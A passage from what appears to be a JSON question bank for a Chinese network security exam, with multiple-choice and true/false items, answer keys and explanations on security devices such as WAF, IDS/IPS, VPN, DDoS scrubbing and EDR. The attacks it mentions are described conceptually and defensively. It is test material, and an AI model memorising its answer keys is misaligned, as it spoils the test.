）。","o":["关键字/正则匹配","文件指纹（精确数据匹配）","自动删除源代码","内容深度分析（OCR、结构化数据识别）"],"a":2,"e":"\u003cb>DLP检测方式：关键字/正则（匹配身份证号/手机号等模式）、精确数据匹配EDM、索引文档匹配IDM、内容分析OCR/语义分析\u003c/b>。部署位置：网络出口（邮件/Web/FTP通道）、终端（U盘拷贝/打印/截屏）、云端。DLP阻断还是告警取决于业务场景与灵敏度调优。"},{"c":"device","t":"s","q":"SDN（软件定义网络）在安全领域的优势是（　）。","o":["降低网络成本","实现网络逻辑集中控制，支持微隔离和动态安全策略下发","减少网络带宽","替代所有硬件设备"],"a":1,"e":"\u003cb>SDN将控制面与数据面分离\u003c/b>，安全优势：控制器集中管理策略、微隔离（VM/容器级别精细分段）、动态响应（检测到威胁自动隔离）、流量调度灵活。配合NSX等虚拟化网络方案，云环境中可实现安全策略随虚拟机迁移。"},{"c":"device","t":"s","q":"漏洞扫描器与渗透测试的核心区别是（　）。","o":["完全相同","漏洞扫描自动化检测已知漏洞，渗透测试由人工模拟攻击并利用漏洞","渗透测试只能用工具","漏洞扫描可以修复漏洞"],"a":1,"e":"\u003cb>漏洞扫描器（如Nessus、OpenVAS）基于插件自动检测已知漏洞，速度快但存在误报\u003c/b>；\u003cb>渗透测试由人工利用漏洞验证实际可利用性，并发现逻辑漏洞等非标风险\u003c/b>。两者互补：扫描器做面上覆盖，渗透做深度验证。扫描器不是渗透测试的替代。"},{"c":"device","t":"s","q":"网络架构中DMZ区的正确理解是（　）。","o":["内网核心服务器区","部署对外服务（Web/邮件/DNS）的隔离区域，位于内网与外网之间","员工办公区域","开发者测试区域"],"a":1,"e":"\u003cb>DMZ（Demilitarized Zone，非军事化区）\u003c/b>：放需要对外提供服务的服务器，防火墙策略为“外网可访问DMZ、DMZ不能直接访问内网、内网可访问DMZ”。即使DMZ服务器被攻破，攻击者还需突破第二道防火墙才能到达内网，实现纵深防御。"},{"c":"device","t":"s","q":"蜜罐与蜜网的区别是（　）。","o":["完全相同","蜜罐是单个诱饵系统，蜜网是多个蜜罐及数据捕获工具组成的受控网络","蜜网只用于无线安全","蜜罐比蜜网更危险"],"a":1,"e":"\u003cb>蜜网（Honeynet）=多个高/低交互蜜罐+数据捕获（网络流量记录、按键记录）+数据控制（防止蜜网被用作跳板攻击第三方）\u003c/b>。蜜网的目标是完整记录攻击者的行为和工具，而非单个蜜罐的简单告警。运营蜜网需要较高的安全专业知识。"},{"c":"device","t":"f","q":"IDS（入侵检测系统）部署为旁路模式，既能检测攻击也能主动阻断攻击。","a":1,"e":"错误。IDS是旁路部署，只检测不阻断（仅告警）；IPS是串联部署，能检测并主动阻断。IDS的优势是对网络性能影响小、不易误断正常业务；IPS的优势是实时阻断减少响应延迟。两者常配合使用。"},{"c":"device","t":"s","q":"IDS的两种主要检测方式是（　）。","o":["仅基于签名","基于特征的检测（匹配已知攻击模式）和基于异常的检测（学习正常行为基线后报警异常）","仅基于端口","仅基于IP"],"a":1,"e":"\u003cb>特征检测：维护已知攻击签名库，匹配即告警，准确但无法发现0day\u003c/b>；\u003cb>异常检测：建立正常行为基线，偏离基线即告警，能发现未知攻击但误报率高\u003c/b>。现代IDS/IPS/EDR结合两种方式，并引入威胁情报辅助。"},{"c":"device","t":"s","q":"WAF（Web应用防火墙）的部署模式不包括（　）。","o":["反向代理模式","透明串联模式","运行在浏览器端作为插件","云WAF模式"],"a":2,"e":"\u003cb>WAF部署模式：反向代理（替换目标域名）、透明串联（串联在网络中）、云WAF（DNS CNAME接入到云厂商）\u003c/b>。WAF运行在服务端/网络层，不是浏览器插件。反向代理模式最常见（如ModSecurity+OWASP CRS规则集）。"},{"c":"device","t":"s","q":"IPSec与SSL VPN的主要区别是（　）。","o":["没有区别","IPSec工作在网络层（加密整个IP包），SSL VPN工作在应用层（基于浏览器访问）","IPSec只在浏览器中使用","SSL VPN只在Linux中使用"],"a":1,"e":"\u003cb>IPSec VPN：网络到网络或远程接入，加密整个IP层通信\u003c/b>，适合内网互联；\u003cb>SSL VPN：基于HTTPS，用户通过浏览器访问，穿透力强\u003c/b>，适合远程办公。IPSec需客户端，SSL VPN通常零客户端。"},{"c":"device","t":"s","q":"UTM（统一威胁管理）设备集成的功能不包括（　）。","o":["防火墙+IPS+AV+VPN+内容过滤","数据库性能调优","反垃圾邮件+URL过滤","网关级安全功能一体化"],"a":1,"e":"\u003cb>UTM将防火墙、IPS、AV、VPN、反垃圾邮件、URL过滤、内容过滤等功能集成到一台设备\u003c/b>。优势是集成度高成本低，劣势是性能瓶颈和单一故障点。NGFW是UTM的进化，更侧重应用识别和用户身份。"},{"c":"device","t":"s","q":"上网行为管理设备的常见功能是（　）。","o":["编译代码","控制员工上网行为（URL过滤、应用识别、带宽管理、即时通讯审计）","管理打印机","加速编译"],"a":1,"e":"\u003cb>上网行为管理：URL分类过滤、应用识别与控制、带宽分配与QoS、邮件/Web即时通讯内容审计\u003c/b>。企业合规和DLP需求驱动部署。注意：需遵守隐私法规，不得监控个人隐私通信内容。"},{"c":"device","t":"s","q":"IPSec中AH与ESP协议的区别是（　）。","o":["两者完全相同","AH只提供认证和完整性但不加密，ESP同时提供加密和认证","AH提供加密而ESP不提供","AH只用于TCP"],"a":1,"e":"\u003cb>AH（Protocol 51）：提供数据源认证和完整性保护，但不加密\u003c/b>；\u003cb>ESP（Protocol 50）：提供加密+认证+完整性\u003c/b>。实际部署中ESP更常用；AH在NAT环境下有问题（NAT修改IP头导致AH校验失败）。"},{"c":"device","t":"s","q":"流量清洗中心主要防御的攻击类型是（　）。","o":["SQL注入","大规模DDoS攻击（SYN Flood、UDP Flood、ICMP Flood等）","暴力破解","XSS"],"a":1,"e":"\u003cb>DDoS清洗：通过BGP Anycast将流量牵引到清洗中心，过滤恶意流量后将干净流量回源\u003c/b>。清洗能力通常达Tbps级别。CDN自带基础DDoS防护，超大攻击需专业清洗服务（如阿里云DDoS高防、Cloudflare）。"},{"c":"device","t":"s","q":"ACL（访问控制列表）的最佳实践是（　）。","o":["允许所有流量后逐条拒绝","默认拒绝所有，按最小必要原则逐条放行","只配置入口ACL不配置出口ACL","在所有接口上应用相同的ACL"],"a":1,"e":"\u003cb>ACL最佳实践：默认DENY ALL（显式拒绝所有），然后按最小必要逐条放行\u003c/b>。ACL应靠近源端或靠近目的端配置。定期审计ACL清理过期规则，使用命名ACL提高可读性。ACL是防火墙策略的基础。"},{"c":"device","t":"s","q":"SD-WAN相比传统WAN的优势是（　）。","o":["SD-WAN不需要加密","智能选路（根据链路质量自动选择最优路径）、简化多分支部署、降低专线成本","SD-WAN只用于局域网","SD-WAN替代所有安全设备"],"a":1,"e":"\u003cb>SD-WAN核心优势：应用感知选路（根据应用类型和链路质量选择MPLS/互联网/4G最优路径）\u003c/b>、集中管理简化多分支运维、降低对昂贵的MPLS专线依赖。安全方面可集成IPS/防火墙。"},{"c":"device","t":"s","q":"EDR（端点检测与响应）与传统杀软的核心区别是（　）。","o":["EDR只是杀毒软件的新名字","EDR基于行为分析和持续监控，能检测未知威胁并支持响应操作","EDR不需要更新","EDR只在云端运行"],"a":1,"e":"\u003cb>传统AV：基于签名匹配已知恶意软件\u003c/b>；\u003cb>EDR：持续监控端点行为（进程树、文件读写、注册表修改、网络连接），通过行为分析/ML检测未知威胁\u003c/b>，支持隔离主机、终止进程等响应操作。"},{"c":"device","t":"s","q":"专门检测并防御Web攻击（SQL注入、XSS等）的设备是（　）。","o":["WAF（Web应用防火墙）","VPN网关","堡垒机","漏洞扫描器"],"a":0,"e":"\u003cb>WAF面向应用层Web流量\u003c/b>，通过规则/语义检测拦截SQL注入、XSS、恶意爬虫等，可旁路（监测）或串接（阻断）部署，是Web业务的重要防线。"},{"c":"device","t":"s","q":"部署在服务器内部、监测系统调用与文件完整性的安全产品是（　）。","o":["HIDS（主机入侵检测）","NIDS（网络入侵检测）","WAF","SIEM"],"a":0,"e":"\u003cb>HIDS部署在主机本机\u003c/b>，监控进程、文件、登录等主机行为（如OSSEC、开源HIDS）；NIDS则旁路监听网络流量，两者互补。"},{"c":"device","t":"s","q":"EDR（端点检测与响应）的主要能力是（　）。","o":["对终端持续检测，并提供调查、隔离与响应处置能力","仅扫描一次病毒","仅管理补丁","仅做流量加密"],"a":0,"e":"\u003cb>EDR在终端持续采集行为数据\u003c/b>，支持威胁溯源、一键隔离与自动化响应；XDR进一步融合终端、网络、邮件、身份等跨域数据，实现联动检测。"},{"c":"device","t":"s","q":"SIEM（安全信息和事件管理）的核心作用是（　）。","o":["集中收集分析多源日志与安全事件，关联分析并统一告警","单独管理一台服务器","只做日志备份","只做网络抓包"],"a":0,"e":"\u003cb>SIEM集中采集设备/主机/应用日志\u003c/b>，通过关联分析发现攻击线索、统一告警与报表，是SOC（安全运营中心）的核心平台，常与SOAR、威胁情报联动。"},{"c":"device","t":"s","q":"SOAR（安全编排自动化与响应）的主要价值是（　）。","o":["将告警研判与响应处置流程编排自动化，降低人工工作量","自动备份数据库","替代防火墙","代替密码学"],"a":0,"e":"\u003cb>SOAR用剧本（Playbook）将告警处置流程自动化\u003c/b>，联动SIEM/EDR/防火墙实现自动封禁、隔离与调查，缓解安全运营中的告警疲劳与人力不足。"},{"c":"device","t":"s","q":"蜜罐（Honeypot）的主要作用是（　）。","o":["伪装高价值诱饵，诱捕并分析攻击者行为","拦截全部攻击流量","做负载均衡","加密业务流量"],"a":0,"e":"\u003cb>蜜罐以虚假目标诱捕攻击者\u003c/b>，记录其工具、手法与意图，用于威胁情报收集与防御验证；蜜网（Honeynet）由多个蜜罐组成更大范围的诱捕网络。"},{"c":"device","t":"s","q":"网络安全架构中，DMZ（非军事区）通常用于放置（　）。","o":["需要对外提供服务但需与内网隔离的主机（如Web/邮件服务器）","核心数据库","内网用户终端","域控服务器"],"a":0,"e":"\u003cb>DMZ位于外网与内网之间\u003c/b>，放置对外服务（Web、Mail、VPN等）；即使DMZ主机被攻破，也不直接进入核心内网，实现风险隔离与纵深防御。"},{"c":"device","t":"s","q":"反向代理的主要作用是（　）。","o":["代表后端服务器接收客户端请求并转发，可隐藏后端、负载均衡、缓存","代理客户端访问外网","解析域名","加密文件"],"a":0,"e":"\u003cb>反向代理位于服务器侧\u003c/b>（Nginx等），统一接收外部请求转发给后端，可隐藏真实服务器、做负载均衡、缓存加速，并可叠加WAF防护。"},{"c":"device","t":"s","q":"对抗DDoS（分布式拒绝服务）攻击最常用的手段是（　）。","o":["流量清洗/黑洞路由配合高防IP","仅升级CPU","增加带宽而不做防护","关闭防火墙"],"a":0,"e":"\u003cb>DDoS防护以流量清洗（将攻击流量牵引到清洗中心过滤）与黑洞路由为主\u003c/b>，配合CDN/高防IP分散流量；仅靠扩容难以应对大流量与CC类攻击。"},{"c":"device","t":"s","q":"DLP（数据防泄漏）产品的主要作用是（　）。","o":["监测并阻止敏感数据经网络、外设、邮件等途径外泄","扫描病毒","加密全部流量","管理账号口令"],"a":0,"e":"\u003cb>DLP识别敏感内容（身份证、银行卡、代码、图纸）并阻断外发\u003c/b>，覆盖网络、终端、邮件与移动介质等通道，支撑数据安全与个人信息保护合规。"},{"c":"device","t":"s","q":"网络访问控制（NAC）的主要作用是（　）。","o":["终端接入网络前进行身份与合规检查（杀毒、补丁、合规性）","加密数据","做漏洞扫描","做邮件审计"],"a":0,"e":"\u003cb>NAC在终端接入前执行策略检查\u003c/b>，不合规终端（无杀毒、未打补丁）被隔离或引导修复，防止带毒设备进入内网，常与802.1X结合实现准入控制。"},{"c":"device","t":"s","q":"漏洞修补与补丁管理的主要目标是（　）。","o":["在攻击者利用之前消除已知漏洞，降低暴露面","增加系统日志","替换操作系统","禁用网络"],"a":0,"e":"\u003cb>及时打补丁能消除已知漏洞\u003c/b>（尤其高危与已被利用漏洞），是性价比最高的防御手段之一；应结合资产清单、漏洞扫描与变更窗口形成闭环。"},{"c":"device","t":"s","q":"旁路部署IDS时，交换机将流量复制给分析设备所使用的技术是（　）。","o":["端口镜像（SPAN）或TAP分光","端口转发","VLAN中继","链路聚合"],"a":0,"e":"\u003cb>旁路分析通过端口镜像（SPAN）或TAP把流量副本送给IDS/SIEM\u003c/b>，不影响业务转发；IPS等串接设备则直接部署在线路上，可实时阻断但会影响性能。"},{"c":"device","t":"s","q":"配置防火墙规则时，更安全的默认策略是（　）。","o":["默认拒绝（Deny All），仅显式放行必要流量","默认放行，只屏蔽已知危险端口","全部放行","默认拒绝但放行全部出站"],"a":0,"e":"\u003cb>安全基线要求“默认拒绝、最小放行”\u003c/b>（白名单思想），只开放必要端口与地址，减少暴露面；默认放行会让大量风险暴露在外部。"},{"c":"device","t":"s","q":"远程运维接入内网，更安全的方式是（　）。","o":["经VPN/堡垒机统一入口，并启用多因素认证（MFA）","直接在公网开放RDP/SSH端口","使用明文Telnet","关闭所有远程访问"],"a":0,"e":"远程运维应\u003cb>经VPN或堡垒机统一入口并启用MFA\u003c/b>，避免把RDP(3389)/SSH直接暴露公网（极易被暴力破解与横向渗透）；这是等保与安全基线的基本要求。"},{"c":"device","t":"s","q":"在部署安全防护之前，通常首先需要（　）。","o":["梳理资产清单（IP、系统、服务、责任人）","立即安装杀毒","立即打补丁","立即上防火墙"],"a":0,"e":"\u003cb>安全建设以资产盘点为前提\u003c/b>：先摸清“有什么、在哪、谁负责”，才能开展漏洞管理、基线加固与防护部署，避免安全防护有死角、有盲区。"},{"c":"device","t":"s","q":"WAF（Web应用防火墙）常用的部署模式是（　）。","o":["透明代理/反向代理模式部署在Web服务器前端","旁路部署在镜像口只审计","部署在终端","部署在DNS服务器"],"a":0,"e":"\u003cb>WAF部署在Web服务器前端，常见透明（串接）、反向代理（代理Web请求）模式\u003c/b>，可检测并拦截SQL注入、XSS等应用层攻击。\u003cb>对比\u003c/b>：旁路部署只能'看+告警'无法阻断；\u003cb>串接/代理才能实时拦截\u003c/b>。\u003cb>易错点\u003c/b>：'WAF必须串接或代理在流量路径上才有阻断能力'。\u003cb>记忆\u003c/b>：'WAF=Web前面的守门员，站队要站在流量必经之路'。"},{"c":"device","t":"s","q":"关于WAF与IDS的区别，正确的是（　）。","o":["WAF针对Web应用流量并可阻断，IDS通用流量检测多旁路告警","两者完全相同","WAF部署在终端","IDS能拦截SQL注入"],"a":0,"e":"\u003cb>WAF面向\u003cb>Web应用协议\u003c/b>（HTTP/SQL等）深度防护并可主动\u003cb>阻断\u003c/b>；IDS是通用入侵检测，多\u003cb>旁路告警\u003c/b>\u003c/b>。\u003cb>扩展\u003c/b>：IPS通用阻断但多为网络层/传输层检测；WAF更懂应用语义（解码、参数校验）。\u003cb>易错点\u003c/b>：'Web攻击优先WAF'。\u003cb>记忆\u003c/b>：'WAF=Web专属拦截，IDS=全网通用的哨兵'。"},{"c":"device","t":"s","q":"DDoS攻击中，SYN Flood的防御机制之一是（　）。","o":["SYN Cookie（不分配半连接资源，用Cookie验证三次握手）","关闭所有端口","升级CPU","重启服务器"],"a":0,"e":"\u003cb>SYN Cookie在SYN洪泛时不立即分配半连接资源，而是以状态信息编码为Cookie回发，收到ACK验证通过才建立连接\u003c/b>，从而抵御资源耗尽型SYN Flood。\u003cb>其他防护\u003c/b>：流量清洗（黑洞+清洗中心）、速率限制、放大反射防护。\u003cb>易错点\u003c/b>：'SYN Cookie=验证代替占坑'。\u003cb>记忆\u003c/b>：'不先占坑，验证通过再建连'。"},{"c":"device","t":"s","q":"应对大流量DDoS（如UDP Flood/反射放大攻击），运营商/云侧常用的手段是（　）。","o":["黑洞路由与流量清洗（引流至清洗中心过滤后回注）","升级防火墙CPU","关闭DNS","增加内存"],"a":0,"e":"\u003cb>大流量DDoS（动辄数百Gbps）本地设备扛不住，需在运营商/云清洗中心\u003cb>黑洞路由（丢弃目标流量保主干）或引流清洗\u003c/b>：把攻击流量引到清洗中心过滤合法流量后再回注\u003c/b>。\u003cb>易错点\u003c/b>：'本地硬扛不现实，要借力上游清洗'。\u003cb>记忆\u003c/b>：'量太大就'绕道洗一洗'再回来'。"},{"c":"device","t":"s","q":"利用开放DNS/NTP等协议放大反射的DDoS攻击中，'放大'的实现原因是（　）。","o":["攻击者以伪造源IP（受害者）发小请求，服务器回包远大于请求（如DNS ANY/Amplified）","服务器加密","网络变快","协议本身无害"],"a":0,"e":"\u003cb>反射放大攻击：攻击者\u003cb>伪造受害者源IP\u003c/b>向开放DNS（ANY查询、EDNS0）/NTP（monlist）/memcached等发送小请求，服务器回包可放大数十至数万倍，大量回包涌向受害者形成DDoS\u003c/b>。\u003cb>防护\u003c/b>：关闭无需开放的UDP服务、源IP验证（BCP38）、上游限速。\u003cb>易错点\u003c/b>：'伪造源IP+大响应=放大器'。\u003cb>记忆\u003c/b>：'小请求换大回包，再嫁祸给受害者'。"},{"c":"device","t":"s","q":"SOAR（安全编排、自动化与响应）平台的主要作用是（　）。","o":["把安全流程编排成剧本，自动化处置告警并联动多设备","替代数据库","管理打印机","生成财务报表"],"a":0,"e":"\u003cb>SOAR通过Playbook（剧本）把检测、研判、遏制、通知等流程自动化\u003c/b>，联动SIEM/EDR/防火墙等自动处置（如自动封IP、隔离主机），提升响应速度、降低重复劳动。\u003cb>易错点\u003c/b>：SOAR'自动化执行'，SIEM'关联分析'，XDR'跨层检测响应'，三者互补。\u003cb>记忆\u003c/b>：'SOAR=把应急流程写成剧本让机器自动演'。"},{"c":"device","t":"s","q":"XDR（扩展检测与响应）相对传统EDR的扩展主要在于（　）。","o":["跨端点、网络、邮件、云等多源数据统一检测与联动响应","只检测文件","只做备份","只查病毒特征"],"a":0,"e":"\u003cb>EDR聚焦\u003cb>端点\u003c/b>（主机），XDR把\u003cb>端点+网络+邮件+云+身份\u003c/b>等遥测统一关联检测并联动响应，覆盖面更广、检测更整体\u003c/b>。\u003cb>易错点\u003c/b>：'EDR管主机，XDR管全栈'。\u003cb>记忆\u003c/b>：'XDR=X跨层检测响应，比EDR看得更全'。"},{"c":"device","t":"s","q":"NAC（网络准入控制）的核心作用是（　）。","o":["终端接入网络前检查其身份/合规状态，不合规则隔离或限入","加密全部流量","分配公网IP","加速路由"],"a":0,"e":"\u003cb>NAC在终端接入网络时验证身份（如802.1X）与安全状态（补丁、杀软、合规基线），不符合则隔离到修复区\u003c/b>，防止带病/未授权终端入网扩散。\u003cb>易错点\u003c/b>：'先查后放'是NAC的精髓。\u003cb>记忆\u003c/b>：'入网先体检，不合格去隔离区补课'。"},{"c":"device","t":"s","q":"802.1X认证协议的典型应用场景是（　）。","o":["有线/无线端口级接入认证（配合RADIUS）","文件加密","DNS解析","邮件推送"],"a":0,"e":"\u003cb>802.1X是端口级接入认证协议，在交换机/AP端口上对终端进行认证，后端对接RADIUS服务器\u003c/b>，常用于企业有线/无线网络准入。\u003cb>易错点\u003c/b>：'802.1X=端口准入，RADIUS=后端认证计费'。\u003cb>记忆\u003c/b>：'802.1X把守端口，RADIUS管认证'。"},{"c":"device","t":"s","q":"RADIUS与TACACS+两种AAA协议的主要区别是（　）。","o":["TACACS+加密整个报文、分离认证/授权/审计，多用于网络设备管理；RADIUS只加密密码、合并认证授权","没有区别","RADIUS用于管理设备","TACACS+用于终端登录"],"a":0,"e":"\u003cb>RADIUS（UDP 1812/1813）只加密口令、认证与授权合一，适合拨号/无线接入计费；TACACS+（TCP 49）\u003cb>整个报文加密\u003c/b>、AAA三者分离，适合网络设备（交换机/路由器）管理员认证\u003c/b>。\u003cb>易错点\u003c/b>：'设备管理认证选TACACS+，终端接入选RADIUS'。\u003cb>记忆\u003c/b>：'TACACS+更严，管设备；RADIUS更广，管接入'。"},{"c":"device","t":"s","q":"堡垒机（跳板机/运维审计系统）的核心价值是（　）。","o":["统一入口管理运维访问，全程审计录像、操作留痕、权限管控","提高网速","自动修漏洞","防止DDoS"],"a":0,"e":"\u003cb>堡垒机把所有运维人员对服务器的访问统一收口：身份认证、按角色授权、全程操作记录/回放（SSH/RDP录屏）、高危命令管控\u003c/b>，满足等保'运维审计'要求并支撑溯源。\u003cb>易错点\u003c/b>：'堡垒机=运维唯一入口+全程留痕'。\u003cb>记忆\u003c/b>：'所有运维都得走一个门，进出都录像'。"},{"c":"device","t":"s","q":"IPsec VPN工作在（　），其两种模式是（　）。","o":["网络层；传输模式与隧道模式","应用层；串联与并联","传输层；加密与不加密","链路层；路由与交换"],"a":0,"e":"\u003cb>IPsec工作在网络层（加密IP报文），\u003cb>传输模式\u003c/b>只加密载荷（端到端主机），\u003cb>隧道模式\u003c/b>加密整个IP包并加新头（站点到站点VPN）\u003c/b>。\u003cb>相关\u003c/b>：IKE（ISAKMP，UDP 500）负责密钥协商，ESP/AH封装加密。\u003cb>易错点\u003c/b>：'站点间用隧道模式，主机间可用传输模式'。\u003cb>记忆\u003c/b>：'IPsec=网络层加密，隧道模式包整包'。"},{"c":"device","t":"s","q":"IPsec中负责密钥协商的协议是（　）。","o":["IKE（ISAKMP，默认UDP 500）","RIP","SNMP","SMTP"],"a":0,"e":"\u003cb>IKE（Internet密钥交换）协商IPsec的加密/认证算法与密钥（IKEv2更简洁、抗DoS）\u003c/b>，UDP 500（NAT穿透用4500）。\u003cb>易错点\u003c/b>：'协商密钥IKE，封装数据ESP/AH'。\u003cb>记忆\u003c/b>：'IKE先谈好怎么加密，ESP再干活'。"},{"c":"device","t":"s","q":"下一代防火墙（NGFW）相比传统防火墙的核心增强是（　）。","o":["集成应用识别、用户识别、IPS/防病毒等一体化深度防护","只增加一个网口","提高转速","更换外壳"],"a":0,"e":"\u003cb>NGFW在传统包过滤/状态检测基础上，集成\u003cb>应用层识别（识别流量是微信还是SSH）、用户识别、IPS、防病毒、威胁情报联动\u003c/b>等，实现一体化边界防护\u003c/b>。\u003cb>易错点\u003c/b>：'NGFW=能'看懂应用'的防火墙'。\u003cb>记忆\u003c/b>：'传统防火墙看端口，NGFW看应用看人'。"},{"c":"device","t":"s","q":"DLP（数据防泄漏）系统的主要作用是（　）。","o":["识别、监控并阻断敏感数据的外发（邮件/外设/网络）","加速网络","杀毒","管理补丁"],"a":0,"e":"\u003cb>DLP对敏感数据（身份证、银行卡、源代码、图纸）进行识别（关键字/正则/指纹），监控并通过邮件、USB、云盘、网络等通道的\u003cb>外发行为并阻断告警\u003c/b>\u003c/b>，防内部泄密。\u003cb>易错点\u003c/b>：'DLP管'出去'的数据，重点防内鬼'。\u003cb>记忆\u003c/b>：'DLP=数据的安检门，出境先过检'。"},{"c":"device","t":"s","q":"态势感知（安全运营中心SOC）平台的核心是（　）。","o":["汇聚多源数据，全局研判威胁并支撑安全运营闭环","只显示网络拓扑图","只做流量转发","替代路由器"],"a":0,"e":"\u003cb>安全态势感知平台/SOC以SIEM/SOAR为底座，汇聚全网日志与告警，进行\u003cb>关联分析、威胁建模、态势展示、响应处置\u003c/b>，实现'看得见、判得准、管得住'的安全运营闭环\u003c/b>。\u003cb>易错点\u003c/b>：'态势感知=全局视角+持续运营'，不只是大屏。\u003cb>记忆\u003c/b>：'SOC=安全运营驾驶舱'。"},{"c":"device","t":"s","q":"蜜罐（Honeypot）与蜜网的主要作用是（　）。","o":["部署诱饵系统/服务诱导攻击者，捕获攻击行为与情报","加速业务","加密流量","提高可用性"],"a":0,"e":"\u003cb>蜜罐=故意暴露的诱饵（假系统/假服务/蜜标文件），攻击者触碰即被记录攻击手法、工具、IP，用于\u003cb>诱捕、溯源与威胁情报收集\u003c/b>，并消耗攻击者精力\u003c/b>。\u003cb>易错点\u003c/b>：蜜罐不保护真实业务，是'情报与迷惑'型防御。\u003cb>记忆\u003c/b>：'蜜罐=请君入瓮，看你怎么攻'。"},{"c":"device","t":"s","q":"邮件安全网关（反垃圾/反钓鱼）的主要能力是（　）。","o":["对入站出站邮件进行垃圾/钓鱼/恶意附件检测与拦截","压缩邮件附件","提高邮件发送速度","管理邮箱容量"],"a":0,"e":"\u003cb>邮件网关对邮件进行垃圾过滤、钓鱼仿冒检测（SPF/DKIM/DMARC）、恶意附件与URL沙箱检测、出站敏感邮件管控\u003c/b>，是防钓鱼/勒索入口的第一道防线。\u003cb>易错点\u003c/b>：'邮件网关防'投毒邮件进网''。\u003cb>记忆\u003c/b>：'邮件进门先过安检'。"},{"c":"device","t":"s","q":"沙箱（Sandbox）检测技术主要解决的问题是（　）。","o":["在隔离环境动态运行可疑文件/附件，判断是否恶意，弥补静态特征查杀盲区","提高网速","加密文件","优化数据库"],"a":0,"e":"\u003cb>沙箱在受控隔离环境动态执行可疑样本，观察其行为（外联、写注册表、释放载荷）判断恶意性\u003c/b>，能发现静态特征库未收录的\u003cb>未知恶意样本\u003c/b>。\u003cb>局限\u003c/b>：高级样本有反沙箱/延时触发规避。\u003cb>易错点\u003c/b>：'沙箱=动态行为判案'。\u003cb>记忆\u003c/b>：'静态查不出，丢进沙箱看它动起来'。"},{"c":"device","t":"s","q":"关于安全域的划分，下列说法正确的是（　）。","o":["按业务与信任级别划分区域（如外网区、DMZ、内网区、核心区），区域间用防火墙/ACL控制","所有服务器放一个网段","不设边界","内外网不加控制"],"a":0,"e":"\u003cb>安全域按\u003cb>信任级别与业务需求\u003c/b>划分：外网区、DMZ（对外服务区）、内网区、管理区、核心数据区等，域间通过防火墙/ACL实施访问控制与最小暴露\u003c/b>，是等保'安全区域边界'与纵深防御的基础。\u003cb>易错点\u003c/b>：'域间要隔离+最小开放'。\u003cb>记忆\u003c/b>：'分区分域、域间设防，DMZ挡外面'。"},{"c":"device","t":"s","q":"负载均衡设备做SSL卸载（SSL Offload）的作用是（　）。","o":["在负载均衡器上终结TLS解密，减轻后端服务器加解密压力（后端可走明文/浅加密）","绕过WAF","禁用HTTPS","降低带宽"],"a":0,"e":"\u003cb>SSL卸载由负载均衡器统一终结TLS握手与加解密，后端服务器不再承担解密开销，同时可对解密后流量做内容检测（配合WAF/审计）\u003c/b>。\u003cb>安全注意\u003c/b>：后端若明文传输，需保证内网链路安全（分段、物理隔离），否则失去端到端加密。\u003cb>易错点\u003c/b>：'卸载≠不安全，内网要管好'。\u003cb>记忆\u003c/b>：'门口统一解密，后端省力气，内网得看牢'。"},{"c":"device","t":"s","q":"数据库防火墙与数据库审计系统的区别是（　）。","o":["数据库防火墙可实时阻断高危SQL（如拖库/脱库），审计系统只记录告警","没有区别","审计系统能阻断","防火墙只记录"],"a":0,"e":"\u003cb>数据库防火墙对SQL进行实时检测并\u003cb>阻断\u003c/b>高危操作（DDoS式拖库、非法访问、SQL注入），数据库审计（DAS）以\u003cb>记录与分析\u003c/b>为主\u003c/b>；实际部署常'审计+防火墙'结合。\u003cb>易错点\u003c/b>：'要拦选数据库防火墙，要留痕选审计'。\u003cb>记忆\u003c/b>：'防火墙敢拦，审计只记账'。"},{"c":"device","t":"s","q":"上网行为管理（上网审计）系统的主要合规作用是（　）。","o":["记录用户上网行为、管控应用与内容，满足等保审计与追溯要求","提升网速","加密流量","替代杀毒"],"a":0,"e":"\u003cb>上网行为管理记录用户的上网URL、应用、流量，进行应用管控（禁止P2P/游戏）与内容过滤，产生可追溯的审计日志\u003c/b>，满足等保'网络行为审计'要求。\u003cb>易错点\u003c/b>：'管上网+留审计日志'。\u003cb>记忆\u003c/b>：'上网也留痕，越界能追溯'。"},{"c":"device","t":"s","q":"VPN网关（如SSL VPN/远程接入）加固的常见要求是（　）。","o":["启用多因素认证、限制来源、及时更新、关闭弱协议（如PPTP）","关闭加密","允许匿名接入","使用固定弱口令"],"a":0,"e":"\u003cb>VPN加固：\u003cb>强制多因素认证\u003c/b>（防凭据被盗）、限制来源IP、更新补丁、关闭PPTP等弱协议、设置会话超时与访问控制、日志审计\u003c/b>；VPN是远程入口，失守=内网敞口。\u003cb>易错点\u003c/b>：'入口设备要高配防护'。\u003cb>记忆\u003c/b>：'大门要双锁（MFA），门禁要严（来源+超时）'。"},{"c":"device","t":"s","q":"关于WAF的'误报'，正确的理解是（　）。","o":["WAF把正常流量误判为攻击而拦截，可能影响业务，需调整规则与白名单","误报越多越好","误报不存在","误报等于漏报"],"a":0,"e":"\u003cb>WAF误报=把正常请求当攻击拦截（如含SQL关键字'select'的普通搜索），可能导致业务功能异常\u003c/b>；需精细化规则、加白名单、使用语义分析降低误报。\u003cb>对比\u003c/b>：漏报=放过真实攻击。\u003cb>易错点\u003c/b>：'误报伤业务，漏报伤安全，要平衡'。\u003cb>记忆\u003c/b>：'规则太敏感伤业务，太迟钝放攻击'。"},{"c":"device","t":"s","q":"EDR（端点检测与响应）相对传统杀毒软件的增强在于（　）。","o":["持续采集行为数据，检测攻击链条并支持溯源与远程响应","只查病毒特征","只做备份","只弹窗"],"a":0,"e":"\u003cb>EDR持续采集端点行为遥测（进程、脚本、内存、网络），基于行为/关联分析检测\u003cb>攻击链\u003c/b>（而非单点特征），支持回溯（时间线）与远程隔离处置\u003c/b>，应对无文件/脚本/新型攻击。\u003cb>易错点\u003c/b>：'杀毒看特征文件，EDR看行为过程'。\u003cb>记忆\u003c/b>：'EDR=给主机装'行车记录仪'+远程刹车'。"},{"c":"device","t":"s","q":"零信任架构落地中，微隔离（Micro-segmentation）的作用是（　）。","o":["在东西向流量上按工作负载/身份实施细粒度隔离，抑制横向移动","只隔离南北向","加密全部","不做控制"],"a":0,"e":"\u003cb>微隔离在\u003cb>数据中心/云内部（东西向）\u003c/b>按工作负载、应用、身份实施细粒度访问控制，即使单点失陷也能\u003cb>阻止横向移动\u003c/b>，是零信任与等保4级增强的核心技术\u003c/b>。\u003cb>易错点\u003c/b>：'微隔离管'内网里互相串门''。\u003cb>记忆\u003c/b>：'内网也设路障，谁也不能随便串门'。"},{"c":"device","t":"s","q":"安全检测中，'旁路部署'与'串接部署'的核心区别是（　